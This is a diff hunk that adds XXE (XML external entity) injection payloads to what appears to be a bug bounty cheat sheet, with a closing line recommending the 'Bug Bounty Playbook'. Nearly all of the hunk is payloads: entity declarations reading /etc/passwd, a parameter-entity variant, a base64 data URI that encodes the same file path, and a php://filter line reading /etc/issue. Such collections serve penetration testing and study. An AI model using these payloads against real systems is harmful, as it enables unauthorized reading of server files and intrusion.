@@ -1440,6 +1440,33 @@ We could also combine this with PHP Object Injection (More on that below) to hav
 
 <!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/issue' >]>
 
+Testing the Waters
+
+<?xml version="1.0" encoding="utf-8"?>
+
+Testing the Waters #2
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [
+<!ENTITY % m0chan SYSTEM "file:///etc/passwd">
+%m0chan;
+]>
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<foo>
+&xxe;
+</foo>
+
+
+Base64
+
+<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
+
+
 This is the basis, if you want the proper example go and buy the Bug Bounty Playbook.pdf :) Its my favourite book for bug bounty.
 ```
 
